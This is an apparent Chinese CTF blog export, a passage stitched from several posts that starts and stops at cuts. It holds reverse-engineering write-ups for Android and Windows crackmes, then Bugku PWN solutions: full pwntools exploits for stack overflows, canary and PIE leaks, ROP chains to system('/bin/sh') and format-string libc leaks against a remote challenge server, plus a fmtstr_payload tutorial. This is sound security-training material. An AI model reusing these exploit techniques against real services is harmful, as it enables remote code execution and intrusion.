break; printf(\"sorry,n error,try again\\n\"); &#125; if ( v1 ) &#123; sub_4576D6(v1 - 1); &#125; else &#123; for ( i = 0; i &lt; 8; ++i ) &#123; if ( (unsigned int)i &gt;= 9 ) j____report_rangecheckfailure(); byte_532E28[i] = 0; &#125; &#125; j__system(\"CLS\"); sub_458054(); if ( byte_532E28[0] == 1 &amp;&amp; byte_532E28[1] == 1 &amp;&amp; byte_532E28[2] == 1 &amp;&amp; byte_532E28[3] == 1 &amp;&amp; byte_532E28[4] == 1 &amp;&amp; byte_532E28[5] == 1 &amp;&amp; byte_532E28[6] == 1 &amp;&amp; byte_532E28[7] == 1 ) &#123; sub_457AB4(); &#125; &#125;&#125; 同时也找到了调用函数sub_45E940，存在两个数组，先两个数组按位异或，再与0x13异或，直接提取出数据然后写脚本跑即可 12345for ( i = 0; i &lt; 56; ++i ) &#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u; &#125; 123456ss4 = [0x12,0x40,0x62,0x5,0x2,0x4,0x6,0x3,0x6,0x30,0x31,0x41,0x20,0x0C,0x30,0x41,0x1F,0x4E,0x3E,0x20,0x31,0x20,0x1,0x39,0x60,0x3,0x15,0x9,0x4,0x3E,0x3,0x5,0x4,0x1,0x2,0x3,0x2C,0x41,0x4E,0x20,0x10,0x61,0x36,0x10,0x2C,0x34,0x20,0x40,0x59,0x2D,0x20,0x41,0x0F,0x22,0x12,0x10,0x0]ss8 = [0x7B,0x20,0x12,0x62,0x77,0x6C,0x41,0x29,0x7C,0x50,0x7D,0x26,0x7C,0x6F,0x4A,0x31,0x53,0x6C,0x5E,0x6C,0x54,0x6,0x60,0x53,0x2C,0x79,0x68,0x6E,0x20,0x5F,0x75,0x65,0x63,0x7B,0x7F,0x77,0x60,0x30,0x6B,0x47,0x5C,0x1D,0x51,0x6B,0x5A,0x55,0x40,0x0C,0x2B,0x4C,0x56,0x0D,0x72,0x1,0x75,0x7E,0x0]flag = \"\"for i in range(0,0x38): flag += chr(ss4[i]^ss8[i]^0x13)print(flag) 得到flag：zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} Timer(阿里CTF)题目分析 在安卓模拟器上运行程序 程序流程 提示信息 Time remaining(s):200000 AliCTF{} 初步分析 应该是200000秒之后才会出现flag 下一步使用安卓调试神器JEB进一步分析 JEB分析 JEB介绍 JEB:IDA+111=JEB,JEB相当于Windows平台上的IDA smali代码:双击Bytecode,出现smali代码;相较于C之汇编,则smali之于Java smali语法参考文章 快捷键：按q切换到java伪代码 进入android程序入口类 进入方式 Bytecode/Hierarchy-net-tomorrow-MainActivity &gt; 双击左边的Bytecode默认进入的就是此入口类 按 Q 查看java伪代码 查看onCreate函数 &gt; 一个activity启动回调的第一个函数就是onCreate,这个函数主要做这个activity启动的一些必要的初始化的工作。 &gt; &gt; onCreate之后调用了还有onRestart()和onStart()等。 查看onCreate回调的MainActivity函数 12345678public MainActivity() &#123;super();this.beg = (((int)&gt;(System.currentTimeMillis() / 1000))) + 200000; //当前时间(beg)为200000加上当前时间(s) this.k = 0; //k初始化为0,和onCreate函数中的flag字符串存在联系this.t = 0;&#125; 查看onCreate回调的is2函数 编写脚本 由于md渲染问题,代码放于文末 运行结果 k=1616384 Android killer修改并打包源程序 进入入口类 搜索字符串 AliCTF 定位到变量 k 搜索stringFromJNI2 上一条句把k存放在寄存器v3中,下面修改v3,就可以修改k 寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、… 修改变量k的值 const v3;1616384 理一理思路 这里我把k的值设置为正确的值,即执行200000次后会出现的值了 但是因为if条件判断为假,程序还是会执行200000次，才会输出flag 这里就需要把&lt;=改为&gt; 搜索&lt;=附近的字符串AliCTF 修改if判断条件 发现这里是反过来的,下一步把 &gt; 改成 &lt;= 将if-gtz v0, :cond_0修改为if-lez v0, :cond_0 编译打包程序 在编译的时候遇到以下问题 &gt;&gt;Project\\res\\values-v23\\styles.xml:6: error: Error retrieving parent for item: No resource found that matches the given name ‘@android:style/WindowTitleBackground’. &gt;&gt; &gt;&gt;Project\\res\\values-v23\\styles.xml:6: error: Error retrieving parent for item: No resource found that matches the given name ‘@android:style/WindowTitleBackground’. 解决方法 找到res/value-v23/styles.xml，把resources下的东西注释掉 1234567&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&gt; &lt;resources&gt;&gt; &lt;!--&gt; ...&gt; --&gt;&gt; &lt;/resources&gt;&gt; &gt; 找到res/value/public.xml，把所有带Base.V23的东西（两个）注释掉 1234567&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&gt; &lt;resources&gt;&gt; &lt;!--&gt; ...&gt; --&gt;&gt; &lt;/resources&gt;&gt; 重新编译打包 模拟器载入新安装包 成功获取flag flag flag{Y0vAr3TimerMa3te7} 总结 环境问题 Android Killer编译apk始终失败 通过换jdk7以及修改res/xml成功编译 运行Jeb闪退 修改jeb_winos.bat,替换java版本 技术问题 不懂smati语言,但是Jeb和AK自身的伪代码转义功能较强,还是可以看懂程序流程 下来需要潜心学习smati语法 本例程序代码量很少,遇到大型程序不会这么简单 代码部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;bool is2(int arg4) &#123; bool v1 = true; if(arg4 &gt; 3) &#123; if(arg4 % 2 != 0 &amp;&amp; arg4 % 3 != 0) &#123; int v0 = 5; while(true) &#123; if(v0 * v0 &lt;= arg4) &#123; if(arg4 % v0 != 0 &amp;&amp; arg4 % (v0 + 2) != 0) &#123; v0 += 6; continue; &#125; return false; &#125; else return v1; &#125; return false; &#125; v1 = false; &#125; else if(arg4 &lt;= 1) v1 = false; return v1;&#125;int main()&#123; int time = 200000; int k = 0; while(time &gt; 0) &#123; if(is2(time)) k+=100; else k--; time--; &#125; cout &lt;&lt; \"k=\" &lt;&lt; k &lt;&lt; endl ; return 0;&#125; 逆向入门发现不是有效的pe文件，用VisualStudio Code打开试试,发现是“image/png；base64”，猜测是经过base64加密的图片，将整段内容复制下来，base64转图片 扫描二维码，得到flag：bugku{inde_9882ihsd8-0} love盲猜flag：I love you，算了不说笑了，还是真实做题吧 载入OD 搜索字符串 随意输入1111111111111111111 发现进行了base64加密 再向下单步 发现、 结合IDA看下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687int sub_4156E0()&#123;size_t v0;// eax@6constchar*v1;// eax@6size_t v2;// eax@9char v4;// [sp+0h] [bp-188h]@6char v5;// [sp+Ch] [bp-17Ch]@1size_t v6;// [sp+10h] [bp-178h]@3size_t j;// [sp+DCh] [bp-ACh]@6size_t i;// [sp+E8h] [bp-A0h]@1char Dest[108];// [sp+F4h] [bp-94h]@5char Str;// [sp+160h] [bp-28h]@6char v11;// [sp+17Ch] [bp-Ch]@6unsignedint v12;// [sp+184h] [bp-4h]@1int savedregs;// [sp+188h] [bp+0h]@1 memset(&amp;v5,0xCCu,0x17Cu);v12 =(unsignedint)&amp;savedregs ^ __security_cookie;for( i =0;(signedint)i &lt;100;++i )&#123;v6 = i;if( i &gt;=0x64)sub_411154();Dest[v6]=0;&#125;sub_41132F(\"please enter the flag:\", v4);sub_411375(\"%20s\",(unsignedint)&amp;Str);v0 = j_strlen(&amp;Str);v1 =(constchar*)sub_4110BE(&amp;Str, v0,&amp;v11);strncpy(Dest, v1,'(');sub_411127();i = j_strlen(Dest);for( j =0;(signedint)j &lt;(signedint)i;++j )Dest[j]+= j;v2 = j_strlen(Dest);strncmp(Dest, Str2, v2);if( sub_411127())sub_41132F(\"wrong flag!\\n\", v4);elsesub_41132F(\"rigth flag!\\n\", v4);sub_41126C(&amp;savedregs,&amp;dword_415890);sub_411280();return sub_411127();&#125; 分析可知:将输入的串Str1先进行base64加密 再与串Str2比较 若相等 则输出“right flag” 由此，我们只需将Str2也就是“e3nifIH9b_C@n@dH”进行解密即可 12345678910111213import base64s =\"e3nifIH9b_C@n@dH\"flag =\"\"for i in range(len(s)):flag += chr(ord(s[i])- i)flag = base64.b64decode(flag)print(flag) 最后拿到答案flag{i_l0ve_you} LoopAndLoop载入JEB，双击MainActivity，选择Decompilea class 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package net.bluelotus.tomorrow.easyandroid; import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View$OnClickListener; public class MainActivity extends AppCompatActivity &#123; // System.loadLibrary()是我们在使用Java的JNI机制时，会用到的一个非常重要的函数 static &#123; System.loadLibrary(\"lhm\"); // 它的作用即是把我们在Java code中声明的native方法的那个libraryload进来，或者load其他什么动态连接库 &#125; public MainActivity() &#123; super(); &#125; public native int chec(int arg1, int arg2) &#123; // native层的chec方法 &#125; public int check(int input, int s) &#123; // check方法将我们的输入和一个int型变量s返回到chec return this.chec(input, s); &#125; public int check1(int input, int s) &#123; // check1定义v1为我们的输入，v0为循环变量1 int v1 = input; int v0 = 1; label_2: // 进入到label_2 if(v0 &lt; 100) &#123; v1 += v0; // 先判断v0是否小于100，如果成立，那么v1每次加上v0的值 ++v0; // v0每次也要自增1 goto label_2; // 直接走向label_2 &#125; return this.chec(v1, s); // 还是将得到的v1及s返回给chec方法 &#125; public int check2(int input, int s) &#123; // 和上面的check与check1一样，都是需要两个参数，一个是我们的输入，一个是s int v2; // v2还是作为chec方法的返回值 int v3 = 1000; int v1 = input; // 定义三个int型变量，v1还是我们的输入，v3做为定值1000，而v2作为返回值(相当于一个标志) if(s % 2 == 0) &#123; int v0; // 当s对2取余等于0，也就是说s能被2整除时，定义一个新的循环变量v0 for(v0 = 1; v0 &lt; v3; ++v0) &#123; v1 += v0; // v0等于1，当小于v3的值也就是小于1000时，v1每次加上v0，v0++ &#125; v2 = this.chec(v1, s); // v2还是作为chec方法的返回值 &#125; else &#123; for(v0 = 1; v0 &lt; v3; ++v0) &#123;//如果取余不等于0，那么还是和上边一样，只不过v1每次减去v0 v1 -= v0; &#125; v2 = this.chec(v1, s);//chec方法的返回值 &#125; return v2;//返回v2 &#125; public int check3(int input, int s) &#123;//check3将输入给v1，将循环变量v0初值设为1，当v0小于10000，v1每次加上v0,而v0循环一次就加1 int v1 = input; int v0; for(v0 = 1; v0 &lt; 10000; ++v0) &#123; v1 += v0; &#125; return this.chec(v1, s); &#125; public String messageMe(String text) &#123;//messageMe方法是返回字符串\"LoopOk\"+text return \"LoopOk\" + text; &#125; protected void onCreate(Bundle savedInstanceState) &#123;//关键的方法onCreate super.onCreate(savedInstanceState); this.setContentView(2130968600);//这两行和布局有关，不用管 this.findViewById(2131492946).setOnClickListener(new View$OnClickListener() &#123; public void onClick(View v) &#123;//最最重要的,从名字就可以看出，当我们点击GETYOURFLAG！这个按钮时触发的onClick int v1; String v2 = this.val$ed.getText().toString();//v2获取我们的输入并转成字符串 try &#123; //下边这个try,catch用来捕获将类型异常 v1 = Integer.parseInt(v2);//将v2这个String字符类型数据转换为Integer整型数据赋值给v1 &#125; catch(NumberFormatException v0) &#123; this.val$tv1.setText(\"Not a Valid Integer number\");//如果不可以转成整数，就在屏幕打印\"不是一个有效的整数\" return; &#125; if(MainActivity.this.check(v1, 99) == 1835996258) &#123;//如果我们输入的v1和s也就是99传给check方法， this.val$tv1.setText(\"The flag is:\");//接着传向chec方法得到的返回值等于1835996258，就输出flag this.val$tv2.setText(\"alictf&#123;\" + MainActivity.this.stringFromJNI2(v1) + \"&#125;\");//括号内是native层stringFromJNI2()方法处理v1后的 &#125; else &#123; this.val$tv1.setText(\"Not Right!\"); &#125; &#125; &#125;); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; this.getMenuInflater().inflate(2131558400, menu); return 1; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; boolean v1 = item.getItemId() == 2131492961 ? true : super.onOptionsItemSelected(item); return v1; &#125; public native String stringFromJNI2(int arg1) &#123; &#125;&#125; 经过分析可知重要的chec和stringFromJNI2都在native层，那么就需要将liblhm.so文件载入IDA进行分析，载入后直接shift+F12搜索字符串双击MainActivity进入，接着找到引用 在按F5就可以将chec反汇编成伪代码了 经过分析 可以知道chec方法根据第二个参数乘2对3取模的结果调用Java层的三个check函数对我们的输入进行处理所以我们只需要写脚本将算法逆过来就好 123456789101112131415161718192021222324252627282930313233343536#! /usr/bin/env python#-*- coding: utf-8 -*-def getinput(): target = 1835996258 for i in range(2,100): if 2 * i % 3 == 0: target = check1(target,i - 1) elif 2 * i % 3 == 1: target = check2(target,i - 1) else: target = check3(target,i - 1) print targetdef check1(input,loopNum): t = input for i in range(1,100): t = t - i return t def check3(input,loopNum): t = input for i in range(1,10000): t = t - i return t def check2(input, loopNum): t = input if loopNum % 2 == 0: for i in range(1,1000): t -= i return t for i in range(1,1000): t += i return t if __name__ == '__main__': getinput() 得到答案：alictf{Jan6N100p3r}","categories":[],"tags":[]},{"title":"Bugku-PWN","slug":"Bugku-PWN","date":"2019-10-05T13:50:27.000Z","updated":"2019-10-06T04:50:54.000Z","comments":true,"path":"2019/10/05/Bugku-PWN/","link":"","permalink":"http://yoursite.com/2019/10/05/Bugku-PWN/","excerpt":"","text":"PWN 1没啥好说直接nc上去cat flag就是了 1234567891011syc@ubuntu:~$ nc 114.116.54.89 10001lsbindevflaghelloworldliblib32lib64cat flagflag&#123;6979d853add353c9&#125; PWN 2先检查一下文件 12345678syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn2$ checksec pwn2[*] '/mnt/hgfs/share/Bugku/PWN/pwn2/pwn2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 直接拿IDA Pro打开反汇编一下 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [rsp+0h] [rbp-30h] memset(&amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\"say something?\"); read(0, &amp;s, 0x100uLL); puts(\"oh,that's so boring!\"); return 0;&#125; 可以发现栈只开了0x30的大小，却可以读取0x100个字符，存在明显的栈溢出漏洞，然后发现一个getshell函数 123456int get_shell_()&#123; puts(\"tql~tql~tql~tql~tql~tql~tql\"); puts(\"this is your flag!\"); return system(\"cat flag\");&#125; 很明显只要我们劫持path到这里就完事了，十分容易 接下来直接给exp吧 12345678from pwn import *#p = process(\"./pwn2\")p = remote('114.116.54.89 ', 10003)getshell = 0x400751payload = \"a\"*0x38+p64(getshell)p.recvuntil('say something?\\n') p.sendline(payload)print p.recvall() 12345[*] Closed connection to 114.116.54.89 port 10003oh,that's so boring!tql~tql~tql~tql~tql~tql~tqlthis is your flag!flag&#123;n0w_y0u_kn0w_the_Stack0verfl0w&#125; PWN 3先检查一下文件 123456[*] '/mnt/hgfs/share/Bugku/PWN/pwn3/read_note' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 防护全开，十分厉害的样子，直接拿IDA Pro打开反汇编一下，没有system，需要用libc构造shell，有canary保护，需要读canary的值，随机地址，需要读程序基址 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vul(); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __cdecl vul()&#123; int note_len; // [rsp+4h] [rbp-4ECh] FILE *fp; // [rsp+8h] [rbp-4E8h] char fpath[20]; // [rsp+10h] [rbp-4E0h] char memory[600]; // [rsp+30h] [rbp-4C0h] char thinking_note[600]; // [rsp+290h] [rbp-260h] unsigned __int64 v5; // [rsp+4E8h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); memset(memory, 0, 0x258uLL); memset(fpath, 0, 0x14uLL); memset(thinking_note, 0, 0x258uLL); puts(\"welcome to noteRead system\"); puts(\"there is there notebook: flag, flag1, flag2\"); puts(\" Please input the note path:\"); read(0, fpath, 0x14uLL); if ( fpath[strlen(fpath) - 1] == 10 ) fpath[strlen(fpath) - 1] = 0; if ( strlen(fpath) &gt; 5 ) &#123; puts(\"note path false!\"); &#125; else &#123; fp = fopen(fpath, \"r\"); noteRead(fp, memory, 0x244u); puts(memory); fclose(fp); &#125; puts(\"write some note:\"); puts(\" please input the note len:\"); note_len = 0; __isoc99_scanf(\"%d\", &amp;note_len); puts(\"please input the note:\"); read(0, thinking_note, (unsigned int)note_len); puts(\"the note is: \"); puts(thinking_note); if ( strlen(thinking_note) != 624 ) &#123; puts(\"error: the note len must be 624\"); puts(\" so please input note(len is 624)\"); read(0, thinking_note, 0x270uLL); &#125;&#125; 123456789void __cdecl noteRead(FILE *fp, char *arg_buf, unsigned int arg_len)&#123; int len; // [rsp+2Ch] [rbp-4h] fread(arg_buf, arg_len, 1uLL, fp); len = strlen(arg_buf); if ( arg_buf[len - 1] == 10 ) arg_buf[len - 1] = 0;&#125; 通过观察，thinking_note是存在栈溢出漏洞的，且notelen我们可以控制的。利用thinking_note进行栈溢出，每次利用第一个read和puts获取一个值，第二个read恢复栈并跳回main函数进行下次攻击 1234memset(thinking_note, 0, 0x258uLL);__isoc99_scanf(&quot;%d&quot;, &amp;note_len);read(0, thinking_note, (unsigned int)note_len);read(0, thinking_note, 0x270uLL); 因为这题存在Canary保护，故第一次肯定为泄露Canary的值，观察下列汇编代码 123456.text:0000000000000AA0 push rbp.text:0000000000000AA1 mov rbp, rsp.text:0000000000000AA4 sub rsp, 4F0h.text:0000000000000AAB mov rax, fs:28h.text:0000000000000AB4 mov [rbp-8], rax.text:0000000000000AB8 xor eax, eax 我们不难得出若要泄露Canary地址应构造：“A” * 0x258，Canary的最低位通常是0x00，所以要将其覆盖（puts函数遇到0x00会停止），故最后应构造： “A” * 0x258+”B” 通过查看IDA可知main函数的相对地址为0x0D20，因为当vul函数执行完毕后需要回到main函数，故栈中最后的反回地址应该是0x0D2E，故第二次将Canary的值写到对应位置，继续覆盖，最低位变为0x20，最后的返回地址从0D2E变为0D20，这样程序就能返回到main函数 第二步读取vul的返回地址，第一次写栈到ebp+8(canary要仍要写到var_8对应的位置)，读到返回地址，然后减去0xD2E(IDA中看到的vul的返回地址) 第三步读取libc基址,libc基址根据main函数的返回地址计算,main函数在call vul之前只有push rbp会影响栈，而我们在前两步分别多执行了一次push rbp，所以一共是执行了三次，那么现在main函数返回地址的位置应该和vul函数返回地址的位置相差0x8*4，也就是ebp+0x28 故Exp最终如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *p = remote(\"114.116.54.89\", 10000)val_add = 0xd2epop_rdi_add = 0xe03puts_plt_add = 0x8b0puts_got_add = 0x202018start_add = 0xd20print p.recvuntil(\"path:\")p.sendline(\"flag\")print p.recvuntil(\"len:\")p.sendline(\"1000\")payload = \"A\" * (0x260-8)+\"B\"p.send(payload)print p.recvuntil(\"B\")canary = u64(p.recv(7).rjust(8,\"\\x00\"))print \"cancay:\", hex(canary)x = p.recvline()p.recvuntil(\"(len is 624)\\n\")payload = \"A\" * (0x260-8) payload += p64(canary)payload += p64(0)payload += \"\\x20\"p.send(payload)print p.recvuntil(\"path:\")p.sendline(\"flag\")print p.recvuntil(\"len:\")p.sendline(\"1000\")payload = \"A\" * (0x260+7)+\"B\"p.send(payload)print p.recvuntil(\"B\")x = p.recvline()val = u64(x[:-1].ljust(8,\"\\x00\"))print \"val:\", hex(val)elf_base = val - val_addprint hex(elf_base)p.recvuntil(\"(len is 624)\\n\")payload = \"A\" * (0x260-8) payload += p64(canary)payload += p64(0)payload += \"\\x20\"p.send(payload)puts_plt = elf_base + puts_plt_addputs_got = elf_base + puts_got_addpop_rdi = elf_base + pop_rdi_addstart = elf_base + start_addp.recvuntil(\"path:\")p.sendline(\"flag\")p.recvuntil(\"len:\")p.sendline(\"1000\")payload = \"A\" * (0x260 + 8*5-1)+\"B\" p.send(payload)p.recvuntil(\"B\")x = p.recvuntil(\"please\")print xstart_abs = u64(x[:8].split(\"\\n\")[0].ljust(8,\"\\x00\"))libc_base = start_abs - 0x20830print hex(start_abs)p.recvuntil(\"(len is 624)\\n\")payload = \"A\" * (0x260-8) payload += p64(canary)payload += p64(0)payload += p64(start)p.send(payload)bin_add = 0x18cd57sys_add = 0x45390bin_abs = libc_base + bin_addsys_abs = libc_base + sys_addp.recvuntil(\"path:\")p.sendline(\"flag\")p.recvuntil(\"len:\")p.sendline(\"1000\")payload = \"A\" * (0x260-8)payload += p64(canary)payload += p64(0)payload += p64(pop_rdi)payload += p64(bin_abs)payload += p64(sys_abs)payload += p64(start)p.send(payload)p.recv()p.recvuntil(\"(len is 624)\\n\")payload = \"A\"p.send(payload)p.interactive() PWN 4先检查一下文件 1234567[*] '/mnt/hgfs/share/Bugku/PWN/pwn4/pwn4' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 直接拿IDA Pro打开反汇编一下 123456789101112__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\"Come on,try to pwn me\"); read(0, &amp;s, 0x30uLL); puts(\"So~sad,you are fail\"); return 0LL;&#125; 存在很明显的栈溢出漏洞 函数虽然调用了system，但参数不是“/bin/sh”，无法获得shell。所以需要我们自己构造shell将“/bin/sh”作为参数传给system函数，然后调用。在ida的数据段搜索“/bin/sh”,找不到，但是可以找到“$0”,也可以得到shell $0在linux中为为shell或shell脚本的名称。system()会调用fork()产生子进程，由子进程来调用/bin/sh -c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将$0作为system的参数，能达到传入‘/bin/sh’一样的效果。 还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）。 我们利用ROPgadget工具进行查找，得到pop rdi ; ret 和$0的地址,system的地址直接在IDA中查看 12345678910111213141516syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn4$ ROPgadget --binary pwn4 --only 'pop|ret'Gadgets information============================================================0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007d0 : pop r14 ; pop r15 ; ret0x00000000004007d2 : pop r15 ; ret0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007d3 : pop rdi ; ret0x00000000004007d1 : pop rsi ; pop r15 ; ret0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : retUnique gadgets found: 11 然后直接开写exp吧 12345678910from pwn import *p = remote('114.116.54.89', 10004)#p = process('./pwn4')pop_rdi = 0x00000000004007d3 bin_sh = 0x000000000060111fsystem = 0x000000000040075Apayload = 'A' * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system) p.recvuntil('Come on,try to pwn me')p.sendline(payload)p.interactive() 12345678910$ lsbindevflagliblib32lib64stack2$ cat flagflag&#123;264bc50112318cd6e1a67b0724d6d3af&#125;$ PWN 5先检查一下文件 123456[*] '/mnt/hgfs/share/Bugku/PWN/pwn5/human' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 直接拿IDA Pro打开反汇编一下 12345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [rsp+0h] [rbp-20h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); memset(&amp;s, 0, 0x20uLL); puts(&amp;::s); read(0, &amp;s, 8uLL); printf(&amp;s, &amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;byte_400978); sleep(1u); puts(asc_400998); read(0, &amp;s, 0x40uLL); if ( !strstr(&amp;s, &amp;needle) || !strstr(&amp;s, &amp;byte_4009BA) ) &#123; puts(&amp;byte_4009C8); exit(0); &#125; puts(&amp;byte_4009F8); return 0;&#125; 首先发现第一次输入存在printf函数，存在格式化字符串漏洞，泄露出栈上的libc_start_main。libc_start_main是libc中的函数，可以泄露出加载libc的基地址。然后就是找服务器system地址和binsh地址，通过gadget赋值。关键是如何通过字符串泄露出libc_start_main的地址，我们通过动态调试来看 首先在printf函数下一个断点，然后运行到此处，查看栈上的情况 123456pwndbg&gt; stack 5000:0000│ rdi rsi rsp 0x7fffffffde60 ◂— 0xa61 /* 'a\\n' */01:0008│ 0x7fffffffde68 ◂— 0x0... ↓04:0020│ rbp 0x7fffffffde80 —▸ 0x4008d0 (__libc_csu_init) ◂— push r1505:0028│ 0x7fffffffde88 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax 123456789pwndbg&gt; x/32w $rsp0x7fffffffde60: 0x24313125 0x00000a70 0x00000000 0x000000000x7fffffffde70: 0x00000000 0x00000000 0x00000000 0x000000000x7fffffffde80: 0x004008d0 0x00000000 0xf7a2d830 0x00007fff0x7fffffffde90: 0xffffdf68 0x00007fff 0xffffdf68 0x00007fff0x7fffffffdea0: 0xf7b99608 0x00000001 0x00400796 0x000000000x7fffffffdeb0: 0x00000000 0x00000000 0x603a5ce0 0xa87e90b70x7fffffffdec0: 0x004006a0 0x00000000 0xffffdf60 0x00007fff0x7fffffffded0: 0x00000000 0x00000000 0x00000000 0x00000000 可以看到在栈上第11个位置存在libc_start_main+240,即libc_start_main_ret的地址，把libc文件放在ida中，找到_libc_start_main函数中调用main函数的地方，查看地址。这个main的返回地址就=libc基址+0x2082E(这个call rax的偏移地址) + 2(call rax的长度为2)，libc的system函数偏移地址0x45390，“/bin/sh”字符串偏移地址0x18cd57，human的pop_rdi_ret地址0x400933，libc中函数的实际地址=libc基址 + 函数偏移地址 然后变量s存在溢出，且要避免执行exit();查看if中比较的两个字符串，一个是“真香”，一个是“鸽子”，也就是说输入字符串s中要同时存在这两个词。 故可写Exp 12345678910111213141516171819202122from pwn import *p = remote(\"114.116.54.89\", \"10005\")#p = process(\"./human\")pop_rdi = 0x400933bin_add = 0x18cd57sys_add = 0x45390gezi = \"鸽子\"zhenxiang = \"真香\"print p.recvuntil(\"?\\n\")p.sendline(\"%11$p.\")print p.recvline()libc_leak = int(p.recvline()[2:-2],16)libc_base = libc_leak - 0x20830print p.recvuntil(\"还有什么本质?\")bin_abs = libc_base + bin_addsys_abs = libc_base + sys_addpayload = (gezi+zhenxiang).ljust(0x20+8,\"A\")payload += p64(pop_rdi)payload += p64(bin_abs)payload += p64(sys_abs)p.sendline(payload)p.interactive()","categories":[],"tags":[]},{"title":"fmtstr模块的使用","slug":"fmtstr─ú┐Θ╡─╩╣╙├","date":"2019-09-25T06:46:18.000Z","updated":"2019-09-25T21:46:54.000Z","comments":true,"path":"2019/09/24/fmtstr─ú┐Θ╡─╩╣╙├/","link":"","permalink":"http://yoursite.com/2019/09/24/fmtstr─ú┐Θ╡─╩╣╙├/","excerpt":"","text":"总所周知，在CTF题目中，有一种很基础但又很令人烦的题型就是格式化字符串，因为我觉得其中的内存构造其实计算得是比较复杂的，但是有了pwntools内置的fmtstr模块对于很多简单的Format String Vulnerability就秒了 cgfsb 不难看出这题的解法就是让pwnme的值为8就好了，按照传统的做法我们需要测量写入位置的参数然后构造复杂的字符串序列，使用pwntools的模块可以大幅简化构造流程，但是我们还是需要测量写入位置 通过 ida 查看汇编代码 找到call printf的地址（调用printf(&amp;s)）。之后我们用gdb进行调试，在调用printf(&amp;s)之前下一个断点,查看接收 message 的变量 s 是格式化字符串的第几个参数。输入 message 的时候输入 ‘aaaa’ 查看当前栈中的内容 传统的Exploit 12345678910111213141516from pwn import *context.log_level = 'debug' DEBUG = int(sys.argv[1])if DEBUG == 1: p = process('./cgfsb') else: p = remote('10.10.49.194', 30147)pwnme_addr = 0x0804A068payload1 = \"ABCD\" payload2 = p32(pwnme_addr) + 'aaaa%10$n'p.recvuntil('please tell me your name:\\n') p.sendline(payload1)p.recvuntil('leave your message please:\\n') p.sendline(payload2)print p.recv() print p.recv() 使用pwntools fmtstr模块的Exploit 12345678910from pwn import *p = remote(\"111.198.29.45\",41020)#p = process('./fmt')payload1 = \"ABCD\"p.recvuntil('please tell me your name:\\n') p.sendline(payload1)payload2 = fmtstr_payload(10,&#123;0x0804A068:0x8&#125;)p.recvuntil('leave your message please:\\n') p.sendline(payload2)p.interactive() 其中10即为参数位置，0x0804A068即为需要修改的地址，0x8即为需要的值","categories":[],"tags":[]},{"title":"从BabyCanary入门Canary","slug":"┤╙BabyCanary╚δ├┼Canary","date":"2019-09-18T12:31:13.000Z","updated":"2019-09-19T03:31:38.000Z","comments":true,"path":"2019/09/18/┤╙BabyCanary╚δ├┼Canary/","link":"","permalink":"http://yoursite.com/2019/09/18/┤╙BabyCanary╚δ├┼Canary/","excerpt":"","text":"Canary直译就是金丝雀，为什么是叫金丝雀 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离 由于 stack overflow 